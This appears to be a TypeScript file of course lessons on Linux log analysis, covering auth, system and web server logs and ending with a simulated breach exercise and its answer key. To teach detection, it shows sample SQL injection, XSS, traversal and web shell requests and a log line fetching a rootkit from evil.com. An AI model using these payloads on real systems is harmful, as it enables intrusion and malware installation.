import { LessonContent } from "../../lessonContent";

// Module 3: Linux System Logs
export const module3: LessonContent[] = [
  {
    id: "3.1",
    courseId: "log-analysis",
    title: "Linux Logging Architecture",
    content: `
# Linux Logging Architecture

Linux has a robust logging infrastructure that's essential for security monitoring. Understanding this architecture helps you know where to find evidence.

## Linux Logging Overview

\`\`\`
┌─────────────────────────────────────────────────────────────┐
│                    Linux Logging Stack                       │
├─────────────────────────────────────────────────────────────┤
│  Applications & Services                                     │
│     ↓                                                        │
│  syslog() / journald API                                    │
│     ↓                                                        │
│  rsyslog / syslog-ng / systemd-journald                     │
│     ↓                                                        │
│  /var/log/* or journalctl                                   │
└─────────────────────────────────────────────────────────────┘
\`\`\`

## Key Log Locations

### /var/log Directory Structure

| Log File | Purpose |
|----------|---------|
| /var/log/auth.log | Authentication events (Debian/Ubuntu) |
| /var/log/secure | Authentication events (RHEL/CentOS) |
| /var/log/syslog | General system messages (Debian/Ubuntu) |
| /var/log/messages | General system messages (RHEL/CentOS) |
| /var/log/kern.log | Kernel messages |
| /var/log/cron | Cron job execution |
| /var/log/maillog | Mail server logs |
| /var/log/apache2/ | Apache web server |
| /var/log/nginx/ | Nginx web server |
| /var/log/audit/ | Linux Audit (auditd) logs |

## Syslog Facilities and Priorities

### Facilities (Sources)
| Facility | Code | Description |
|----------|------|-------------|
| kern | 0 | Kernel messages |
| user | 1 | User-level messages |
| mail | 2 | Mail system |
| daemon | 3 | System daemons |
| auth | 4 | Security/auth |
| syslog | 5 | Syslog internal |
| local0-7 | 16-23 | Custom use |

### Priorities (Severity)
| Priority | Code | Description |
|----------|------|-------------|
| emerg | 0 | System unusable |
| alert | 1 | Immediate action needed |
| crit | 2 | Critical conditions |
| err | 3 | Error conditions |
| warning | 4 | Warning conditions |
| notice | 5 | Normal but significant |
| info | 6 | Informational |
| debug | 7 | Debug messages |

## systemd-journald

Modern Linux systems use **journald** alongside or instead of traditional syslog.

### journalctl Commands

\`\`\`bash
# View all logs
journalctl

# View logs since boot
journalctl -b

# View logs for specific service
journalctl -u sshd

# View logs since specific time
journalctl --since "2023-10-11 08:00:00"

# Follow logs in real-time
journalctl -f

# Show only errors and above
journalctl -p err

# View authentication logs
journalctl -t sshd

# Output as JSON
journalctl -o json-pretty
\`\`\`

## rsyslog Configuration

rsyslog is the most common syslog implementation.

### Configuration File: /etc/rsyslog.conf

\`\`\`
# Log auth messages to auth.log
auth,authpriv.*    /var/log/auth.log

# Log everything except auth to syslog
*.*;auth,authpriv.none    /var/log/syslog

# Log kernel messages to kern.log
kern.*    /var/log/kern.log

# Forward logs to remote server
*.* @@192.168.1.100:514
\`\`\`

## Log Rotation

Logs are rotated to manage disk space via **logrotate**.

### Configuration: /etc/logrotate.d/rsyslog

\`\`\`
/var/log/syslog
{
    rotate 7
    daily
    missingok
    notifempty
    delaycompress
    compress
    postrotate
        /usr/lib/rsyslog/rsyslog-rotate
    endscript
}
\`\`\`

## Linux Audit System (auditd)

**auditd** provides detailed system call auditing.

### Key Files
- **/etc/audit/auditd.conf** - Daemon configuration
- **/etc/audit/audit.rules** - Audit rules
- **/var/log/audit/audit.log** - Audit log

### Common Audit Rules

\`\`\`bash
# Monitor file access
-w /etc/passwd -p wa -k identity
-w /etc/shadow -p wa -k identity

# Monitor command execution
-a always,exit -F arch=b64 -S execve -k exec

# Monitor network connections
-a always,exit -F arch=b64 -S connect -k network

# Monitor user/group changes
-w /etc/group -p wa -k identity
-w /etc/gshadow -p wa -k identity
\`\`\`

### Reading Audit Logs

\`\`\`bash
# Search audit log
ausearch -k identity

# Generate report
aureport -au

# Watch specific user
ausearch -ua username
\`\`\`

## Useful Commands

\`\`\`bash
# View last logins
last

# View failed logins
lastb

# View currently logged in users
who

# View login history
lastlog

# View system uptime and users
w
\`\`\`
    `,
    keyTakeaways: [
      "Linux stores logs in /var/log with distribution-specific file names",
      "auth.log (Debian) or secure (RHEL) contain authentication events",
      "journalctl is the modern way to query logs on systemd systems",
      "auditd provides detailed system call auditing for security",
      "Understanding syslog facilities and priorities helps filter logs"
    ]
  },
  {
    id: "3.2",
    courseId: "log-analysis",
    title: "Authentication Logs (auth.log/secure)",
    content: `
# Authentication Logs (auth.log/secure)

Authentication logs are the most security-critical logs on Linux systems. They record all login attempts, sudo usage, and PAM events.

## Log Locations

| Distribution | Auth Log Path |
|--------------|---------------|
| Debian/Ubuntu | /var/log/auth.log |
| RHEL/CentOS/Fedora | /var/log/secure |
| SUSE | /var/log/messages |

## SSH Authentication Events

### Successful SSH Login
\`\`\`
Oct 11 10:15:30 server sshd[12345]: Accepted publickey for john from 192.168.1.100 port 54321 ssh2: RSA SHA256:aBcDeFg...
Oct 11 10:15:30 server sshd[12345]: pam_unix(sshd:session): session opened for user john by (uid=0)
\`\`\`

### Failed SSH Login
\`\`\`
Oct 11 10:15:30 server sshd[12345]: Failed password for invalid user admin from 192.168.1.100 port 54321 ssh2
Oct 11 10:15:31 server sshd[12345]: Connection closed by authenticating user admin 192.168.1.100 port 54321 [preauth]
\`\`\`

### SSH Brute Force Pattern
\`\`\`
Oct 11 10:15:30 server sshd[12345]: Failed password for root from 192.168.1.100 port 54321
Oct 11 10:15:31 server sshd[12346]: Failed password for root from 192.168.1.100 port 54322
Oct 11 10:15:32 server sshd[12347]: Failed password for root from 192.168.1.100 port 54323
Oct 11 10:15:33 server sshd[12348]: Failed password for root from 192.168.1.100 port 54324
\`\`\`

## Sudo Events

### Successful Sudo
\`\`\`
Oct 11 10:20:00 server sudo: john : TTY=pts/0 ; PWD=/home/john ; USER=root ; COMMAND=/usr/bin/apt update
\`\`\`

### Failed Sudo (Wrong Password)
\`\`\`
Oct 11 10:20:00 server sudo: pam_unix(sudo:auth): authentication failure; logname=john uid=1000 euid=0 tty=/dev/pts/0 ruser=john rhost= user=john
Oct 11 10:20:05 server sudo: john : 3 incorrect password attempts ; TTY=pts/0 ; PWD=/home/john ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
\`\`\`

### Unauthorized Sudo Attempt
\`\`\`
Oct 11 10:20:00 server sudo: baduser : user NOT in sudoers ; TTY=pts/0 ; PWD=/home/baduser ; USER=root ; COMMAND=/bin/bash
\`\`\`

## User Account Events

### User Added
\`\`\`
Oct 11 10:25:00 server useradd[12345]: new user: name=newuser, UID=1001, GID=1001, home=/home/newuser, shell=/bin/bash
\`\`\`

### Password Changed
\`\`\`
Oct 11 10:25:30 server passwd[12346]: pam_unix(passwd:chauthtok): password changed for newuser
\`\`\`

### User Added to Group
\`\`\`
Oct 11 10:26:00 server usermod[12347]: add 'newuser' to group 'sudo'
\`\`\`

## PAM Events

PAM (Pluggable Authentication Modules) logs authentication for all services.

### PAM Success
\`\`\`
Oct 11 10:30:00 server sshd[12345]: pam_unix(sshd:session): session opened for user john by (uid=0)
\`\`\`

### PAM Failure
\`\`\`
Oct 11 10:30:00 server sshd[12345]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.1.100 user=john
\`\`\`

## Detection Patterns

### SSH Brute Force Detection
\`\`\`bash
# Count failed logins by IP
grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn

# Find IPs with more than 10 failed attempts
grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | awk '$1 > 10'
\`\`\`

### Successful Logins from Unusual IPs
\`\`\`bash
# List all successful logins with source IPs
grep "Accepted" /var/log/auth.log | awk '{print $1, $2, $3, $9, $11}'
\`\`\`

### Sudo Abuse Detection
\`\`\`bash
# Find failed sudo attempts
grep "authentication failure" /var/log/auth.log | grep sudo

# Find users not in sudoers
grep "NOT in sudoers" /var/log/auth.log
\`\`\`

### Unusual Account Activity
\`\`\`bash
# New user creation
grep "useradd" /var/log/auth.log

# Password changes
grep "password changed" /var/log/auth.log

# Group membership changes
grep "to group" /var/log/auth.log
\`\`\`

## Quick Reference: Key Patterns

| Pattern | Indicates |
|---------|-----------|
| "Failed password" | Failed login attempt |
| "Accepted password" | Successful password auth |
| "Accepted publickey" | Successful key auth |
| "invalid user" | Login attempt for nonexistent user |
| "NOT in sudoers" | Unauthorized sudo attempt |
| "session opened" | Login session started |
| "session closed" | Logout |
| "authentication failure" | PAM auth failed |
    `,
    keyTakeaways: [
      "auth.log (Debian) or secure (RHEL) are critical for security monitoring",
      "'Failed password' entries reveal brute force attempts",
      "Sudo logs show privilege escalation attempts",
      "'NOT in sudoers' indicates unauthorized privilege attempts",
      "PAM logs record authentication across all services"
    ],
    practicalExercise: {
      title: "Auth Log Analysis",
      description: "Analyze a sample auth.log file for security events.",
      steps: [
        "Count total failed SSH logins",
        "Identify the top 5 source IPs for failed logins",
        "Find any successful logins after failed attempts",
        "List all sudo commands run as root",
        "Identify any new user accounts created"
      ]
    }
  },
  {
    id: "3.3",
    courseId: "log-analysis",
    title: "System & Application Logs",
    content: `
# System & Application Logs

Beyond authentication, Linux logs system events, service activity, and application behavior that are valuable for security analysis.

## System Logs

### /var/log/syslog or /var/log/messages

General system messages from various sources.

\`\`\`
Oct 11 10:00:00 server systemd[1]: Starting Apache HTTP Server...
Oct 11 10:00:01 server systemd[1]: Started Apache HTTP Server.
Oct 11 10:05:00 server kernel: [UFW BLOCK] IN=eth0 OUT= MAC=... SRC=192.168.1.100 DST=10.0.0.1 ...
\`\`\`

### /var/log/kern.log

Kernel messages including hardware, drivers, and security events.

\`\`\`
Oct 11 10:00:00 server kernel: [   0.000000] Linux version 5.4.0-42-generic
Oct 11 10:05:00 server kernel: usb 1-1: new high-speed USB device number 2
Oct 11 10:10:00 server kernel: [UFW BLOCK] IN=eth0 OUT= SRC=192.168.1.100 ...
\`\`\`

**Security-relevant kernel messages:**
- UFW/iptables blocks
- USB device connections
- Segfaults and crashes
- OOM killer events
- SELinux/AppArmor denials

### /var/log/dmesg

Boot-time kernel messages.

\`\`\`bash
# View boot messages
dmesg

# View only errors
dmesg --level=err,warn

# Follow new messages
dmesg -w
\`\`\`

## Service-Specific Logs

### Cron Jobs (/var/log/cron)

\`\`\`
Oct 11 10:00:01 server CRON[12345]: (root) CMD (/usr/local/bin/backup.sh)
Oct 11 10:00:01 server CRON[12346]: (www-data) CMD (php /var/www/cron.php)
\`\`\`

**Security concerns:**
- Unexpected cron jobs (persistence)
- Jobs running as root
- Jobs executing from /tmp or unusual paths

### Package Manager Logs

**Debian/Ubuntu:**
\`\`\`
# /var/log/dpkg.log
2023-10-11 10:00:00 install package-name:amd64 <none> 1.0.0
2023-10-11 10:00:01 status installed package-name:amd64 1.0.0
\`\`\`

**RHEL/CentOS:**
\`\`\`
# /var/log/yum.log or /var/log/dnf.log
Oct 11 10:00:00 Installed: package-name-1.0.0.x86_64
\`\`\`

**Security concerns:**
- Unexpected package installations
- Security tools being removed
- Kernel updates

### Boot Logs (/var/log/boot.log)

Services started during boot.

\`\`\`
Oct 11 10:00:00 server systemd[1]: Starting OpenBSD Secure Shell server...
Oct 11 10:00:01 server systemd[1]: Started OpenBSD Secure Shell server.
\`\`\`

## Application Logs

### Mail Logs (/var/log/mail.log)

\`\`\`
Oct 11 10:00:00 server postfix/smtpd[12345]: connect from unknown[192.168.1.100]
Oct 11 10:00:01 server postfix/smtpd[12345]: NOQUEUE: reject: RCPT from unknown[192.168.1.100]: 554 5.7.1 <admin@target.com>: Relay access denied
\`\`\`

**Security concerns:**
- Spam relay attempts
- Phishing email sources
- Unusual sending patterns

### Database Logs

**MySQL:**
\`\`\`
# /var/log/mysql/error.log
2023-10-11T10:00:00.000000Z 0 [Warning] Access denied for user 'root'@'192.168.1.100' (using password: YES)
\`\`\`

**PostgreSQL:**
\`\`\`
# /var/log/postgresql/postgresql-14-main.log
2023-10-11 10:00:00.000 UTC [12345] FATAL: password authentication failed for user "admin"
\`\`\`

### Container Logs

**Docker:**
\`\`\`bash
# View container logs
docker logs container_name

# Follow logs
docker logs -f container_name

# Logs are stored in:
/var/lib/docker/containers/<container-id>/<container-id>-json.log
\`\`\`

## Security-Relevant Patterns

### Service Crashes
\`\`\`
Oct 11 10:00:00 server kernel: nginx[12345]: segfault at 0 ip 00007f... sp 00007ff...
Oct 11 10:00:00 server systemd[1]: nginx.service: Main process exited, code=killed, status=11/SEGV
\`\`\`

### OOM Killer (Out of Memory)
\`\`\`
Oct 11 10:00:00 server kernel: Out of memory: Killed process 12345 (java) total-vm:8388608kB
\`\`\`

### UFW/iptables Blocks
\`\`\`
Oct 11 10:00:00 server kernel: [UFW BLOCK] IN=eth0 OUT= MAC=... SRC=192.168.1.100 DST=10.0.0.1 LEN=44 TOS=0x00 PREC=0x00 TTL=243 ID=54321 PROTO=TCP SPT=54321 DPT=22 WINDOW=65535
\`\`\`

### AppArmor/SELinux Denials
\`\`\`
Oct 11 10:00:00 server kernel: audit: type=1400 audit(1633954800.000:100): apparmor="DENIED" operation="open" profile="/usr/sbin/apache2" name="/etc/shadow"
\`\`\`

## Analysis Commands

\`\`\`bash
# Find errors in syslog
grep -i "error\\|fail\\|denied\\|block" /var/log/syslog

# Monitor logs in real-time
tail -f /var/log/syslog | grep --line-buffered -i "error"

# Find recent service restarts
journalctl -u "*.service" --since "1 hour ago" | grep -i "start\\|stop"

# View firewall blocks
grep "UFW BLOCK" /var/log/syslog | awk '{print $12}' | cut -d= -f2 | sort | uniq -c | sort -rn
\`\`\`
    `,
    keyTakeaways: [
      "syslog/messages contain general system events from multiple sources",
      "Kernel logs reveal firewall blocks, crashes, and hardware events",
      "Cron logs can expose persistence mechanisms",
      "Package manager logs show software installations and removals",
      "AppArmor/SELinux denials indicate blocked malicious behavior"
    ]
  },
  {
    id: "3.4",
    courseId: "log-analysis",
    title: "Web Server Logs (Apache/Nginx)",
    content: `
# Web Server Logs (Apache/Nginx)

Web server logs are essential for detecting web-based attacks, unauthorized access attempts, and reconnaissance activity.

## Apache Log Locations

| Log Type | Default Path |
|----------|--------------|
| Access Log | /var/log/apache2/access.log |
| Error Log | /var/log/apache2/error.log |
| Virtual Host | /var/log/apache2/vhost-access.log |

## Nginx Log Locations

| Log Type | Default Path |
|----------|--------------|
| Access Log | /var/log/nginx/access.log |
| Error Log | /var/log/nginx/error.log |

## Combined Log Format

Most web servers use the **Combined Log Format**:

\`\`\`
%h %l %u %t "%r" %>s %b "%{Referer}i" "%{User-Agent}i"
\`\`\`

### Example Entry
\`\`\`
192.168.1.100 - john [11/Oct/2023:10:00:00 +0000] "GET /admin/login.php HTTP/1.1" 200 1234 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
\`\`\`

### Field Breakdown

| Field | Value | Description |
|-------|-------|-------------|
| %h | 192.168.1.100 | Client IP address |
| %l | - | Identity (usually -) |
| %u | john | Authenticated username |
| %t | [11/Oct/2023:10:00:00 +0000] | Timestamp |
| %r | "GET /admin/login.php HTTP/1.1" | Request line |
| %>s | 200 | HTTP status code |
| %b | 1234 | Response size in bytes |
| Referer | https://example.com/ | Referring URL |
| User-Agent | Mozilla/5.0... | Client browser/tool |

## HTTP Status Codes for Security

| Code | Meaning | Security Relevance |
|------|---------|-------------------|
| 200 | OK | Successful request |
| 301/302 | Redirect | May indicate redirect attacks |
| 400 | Bad Request | Malformed request, possible attack |
| 401 | Unauthorized | Authentication required/failed |
| 403 | Forbidden | Access denied |
| 404 | Not Found | Scanning for files/directories |
| 500 | Server Error | Possible exploitation attempt |
| 503 | Service Unavailable | Overload, possible DDoS |

## Web Attack Patterns

### SQL Injection Attempts
\`\`\`
192.168.1.100 - - [11/Oct/2023:10:00:00] "GET /search?q=1' OR '1'='1 HTTP/1.1" 200 ...
192.168.1.100 - - [11/Oct/2023:10:00:01] "GET /user?id=1 UNION SELECT * FROM users-- HTTP/1.1" 500 ...
\`\`\`

**Indicators:**
- Single quotes (')
- SQL keywords: UNION, SELECT, INSERT, DROP
- Comment characters: --, #, /*
- OR 1=1 patterns

### XSS Attempts
\`\`\`
192.168.1.100 - - [11/Oct/2023:10:00:00] "GET /search?q=<script>alert('xss')</script> HTTP/1.1" 200 ...
\`\`\`

**Indicators:**
- <script> tags
- javascript: URLs
- Event handlers: onerror, onload
- URL-encoded versions: %3Cscript%3E

### Directory Traversal
\`\`\`
192.168.1.100 - - [11/Oct/2023:10:00:00] "GET /files/../../../etc/passwd HTTP/1.1" 200 ...
\`\`\`

**Indicators:**
- ../ sequences
- URL-encoded: %2e%2e%2f
- Targeting sensitive files: /etc/passwd, /etc/shadow

### Web Shell Access
\`\`\`
192.168.1.100 - - [11/Oct/2023:10:00:00] "POST /uploads/shell.php HTTP/1.1" 200 50
192.168.1.100 - - [11/Oct/2023:10:00:01] "GET /uploads/shell.php?cmd=whoami HTTP/1.1" 200 12
\`\`\`

**Indicators:**
- POST to unusual .php files
- GET with cmd, command, c parameters
- Small response sizes (command output)
- Requests to /uploads, /tmp, /temp directories

### Scanner/Bot Activity
\`\`\`
192.168.1.100 - - [11/Oct/2023:10:00:00] "GET /admin HTTP/1.1" 404
192.168.1.100 - - [11/Oct/2023:10:00:01] "GET /administrator HTTP/1.1" 404
192.168.1.100 - - [11/Oct/2023:10:00:02] "GET /wp-admin HTTP/1.1" 404
192.168.1.100 - - [11/Oct/2023:10:00:03] "GET /phpmyadmin HTTP/1.1" 404
\`\`\`

**Indicators:**
- Rapid 404 sequences
- Common admin paths
- WordPress, Drupal, Joomla paths
- Unusual User-Agents: curl, python-requests, nikto

## Analysis Commands

\`\`\`bash
# Top IPs by request count
awk '{print $1}' access.log | sort | uniq -c | sort -rn | head 20

# Find potential SQL injection
grep -E "(SELECT|UNION|INSERT|DROP|--|'|%27)" access.log

# Find 404 scanners
awk '$9 == 404 {print $1}' access.log | sort | uniq -c | sort -rn | head 20

# Find POST requests (potential uploads/exploits)
grep "POST" access.log | awk '{print $1, $7}' | sort | uniq -c | sort -rn

# Find requests to common attack paths
grep -E "(shell|cmd|exec|eval|upload|admin)" access.log

# Analyze User-Agents
awk -F'"' '{print $6}' access.log | sort | uniq -c | sort -rn | head 20

# Find large responses (possible data exfiltration)
awk '$10 > 1000000 {print $1, $7, $10}' access.log
\`\`\`

## Suspicious User-Agents

| User-Agent | Likely Tool |
|------------|-------------|
| sqlmap | SQL injection tool |
| nikto | Web vulnerability scanner |
| nmap | Port scanner |
| python-requests | Scripted attacks |
| curl | Command-line tool |
| Googlebot (fake) | Impersonation |
    `,
    keyTakeaways: [
      "Combined Log Format provides IP, URL, status, referrer, and User-Agent",
      "404 storms indicate directory/file scanning",
      "SQL injection shows as quotes and SQL keywords in URLs",
      "Web shells have distinctive access patterns (cmd parameters)",
      "Unusual User-Agents often indicate automated attacks"
    ]
  },
  {
    id: "3.5",
    courseId: "log-analysis",
    title: "Hands-On: Linux Log Analysis Challenge",
    content: `
# Hands-On: Linux Log Analysis Challenge

Time to put your Linux log analysis skills to the test! Investigate this simulated breach using only log files.

## Scenario

A web server was compromised. The incident response team has provided you with logs. Your mission:

1. Determine the initial access method
2. Identify attacker activities
3. Document all IOCs
4. Reconstruct the attack timeline

## Log Samples

### auth.log (Authentication Events)

\`\`\`
Oct 11 08:00:15 webserver sshd[12301]: Failed password for root from 203.0.113.50 port 54321 ssh2
Oct 11 08:00:16 webserver sshd[12302]: Failed password for root from 203.0.113.50 port 54322 ssh2
Oct 11 08:00:17 webserver sshd[12303]: Failed password for root from 203.0.113.50 port 54323 ssh2
... (500 more failed attempts from same IP)
Oct 11 08:05:30 webserver sshd[12805]: Accepted password for root from 203.0.113.50 port 55001 ssh2
Oct 11 08:05:30 webserver sshd[12805]: pam_unix(sshd:session): session opened for user root by (uid=0)
Oct 11 08:06:00 webserver useradd[12810]: new user: name=backdoor, UID=1001, GID=1001, home=/home/backdoor, shell=/bin/bash
Oct 11 08:06:05 webserver usermod[12811]: add 'backdoor' to group 'sudo'
Oct 11 08:10:00 webserver sudo: backdoor : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/wget http://evil.com/rootkit.tar.gz
\`\`\`

### access.log (Web Server)

\`\`\`
Oct 11 07:30:00 203.0.113.50 - - "GET /admin HTTP/1.1" 404 162
Oct 11 07:30:01 203.0.113.50 - - "GET /wp-admin HTTP/1.1" 404 162
Oct 11 07:30:02 203.0.113.50 - - "GET /administrator HTTP/1.1" 404 162
Oct 11 07:30:03 203.0.113.50 - - "GET /phpmyadmin HTTP/1.1" 200 4523
Oct 11 07:31:00 203.0.113.50 - - "GET /phpmyadmin/index.php?target=db_sql.php%253f/../../../../etc/passwd HTTP/1.1" 200 1847
Oct 11 07:32:00 203.0.113.50 - - "POST /phpmyadmin/import.php HTTP/1.1" 200 523
\`\`\`

### syslog (System Events)

\`\`\`
Oct 11 08:06:30 webserver systemd[1]: Started backdoor.service.
Oct 11 08:06:31 webserver kernel: [UFW ALLOW] IN=eth0 OUT= SRC=203.0.113.50 DST=10.0.0.5 PROTO=TCP SPT=55001 DPT=22
Oct 11 08:08:00 webserver CRON[12850]: (root) CMD (/tmp/.hidden/persist.sh)
Oct 11 08:10:30 webserver kernel: [UFW ALLOW] IN= OUT=eth0 SRC=10.0.0.5 DST=45.33.32.156 PROTO=TCP SPT=45678 DPT=443
\`\`\`

### cron log

\`\`\`
Oct 11 08:07:00 webserver crontab[12840]: (root) REPLACE (root)
Oct 11 08:07:00 webserver crontab[12840]: (root) LIST (root)
\`\`\`

## Investigation Questions

### Question 1: Reconnaissance
What did the attacker do before attempting SSH access?

**Answer:** _______________________

### Question 2: Initial Access (Web)
The attacker found an exposed service. What was it?

**Answer:** _______________________

### Question 3: Vulnerability Exploited
What type of attack was used against phpMyAdmin?

**Answer:** _______________________

### Question 4: Initial Access (SSH)
How did the attacker gain SSH access?

**Answer:** _______________________

### Question 5: Persistence Mechanism 1
What user account was created for persistence?

**Answer:** _______________________

### Question 6: Persistence Mechanism 2
What service was created?

**Answer:** _______________________

### Question 7: Persistence Mechanism 3
What cron job was added?

**Answer:** _______________________

### Question 8: C2 Communication
What IP did the server connect to after compromise?

**Answer:** _______________________

### Question 9: Malware Downloaded
What was the name of the malicious file downloaded?

**Answer:** _______________________

## Attack Timeline

Fill in the timeline:

\`\`\`
07:30:00 ─── ___________________________
    │
07:30:03 ─── ___________________________
    │
07:31:00 ─── ___________________________
    │
08:00:15 ─── ___________________________
    │
08:05:30 ─── ___________________________
    │
08:06:00 ─── ___________________________
    │
08:06:30 ─── ___________________________
    │
08:07:00 ─── ___________________________
    │
08:08:00 ─── ___________________________
    │
08:10:00 ─── ___________________________
    │
08:10:30 ─── ___________________________
\`\`\`

## IOC Extraction

Document all IOCs:

**IP Addresses:**
- ___________________________
- ___________________________

**URLs/Domains:**
- ___________________________
- ___________________________

**File Paths:**
- ___________________________
- ___________________________

**User Accounts:**
- ___________________________

**Services:**
- ___________________________

---

## Answers

1. Web application scanning (404 attempts on /admin, /wp-admin, etc.)
2. phpMyAdmin
3. Path/Directory traversal
4. SSH brute force (500+ failed attempts, then success)
5. "backdoor"
6. backdoor.service
7. /tmp/.hidden/persist.sh
8. 45.33.32.156
9. rootkit.tar.gz

**Timeline:**
\`\`\`
07:30:00 ─── Web scanning begins
07:30:03 ─── phpMyAdmin found (200 response)
07:31:00 ─── Directory traversal exploit
08:00:15 ─── SSH brute force begins
08:05:30 ─── SSH access gained (root)
08:06:00 ─── Backdoor user created, added to sudo
08:06:30 ─── Malicious service started
08:07:00 ─── Cron job modified
08:08:00 ─── Persistence script runs
08:10:00 ─── Malware downloaded
08:10:30 ─── C2 connection established
\`\`\`

**IOCs:**
- IPs: 203.0.113.50 (attacker), 45.33.32.156 (C2)
- URLs: http://evil.com/rootkit.tar.gz
- Paths: /tmp/.hidden/persist.sh
- Users: backdoor
- Services: backdoor.service
    `,
    keyTakeaways: [
      "Correlate logs across auth, web, and system sources for full visibility",
      "Attackers often perform reconnaissance before exploitation",
      "Multiple persistence mechanisms are common (user, service, cron)",
      "Timeline reconstruction reveals the attack sequence",
      "IOC extraction is critical for blocking and hunting"
    ],
    practicalExercise: {
      title: "Write the Incident Report",
      description: "Create a formal incident report from this investigation.",
      steps: [
        "Write an executive summary",
        "Document the attack chain (MITRE ATT&CK mapping)",
        "List all IOCs with context",
        "Provide remediation steps",
        "Suggest detection improvements"
      ]
    },
    quiz: "la-q3"
  }
];
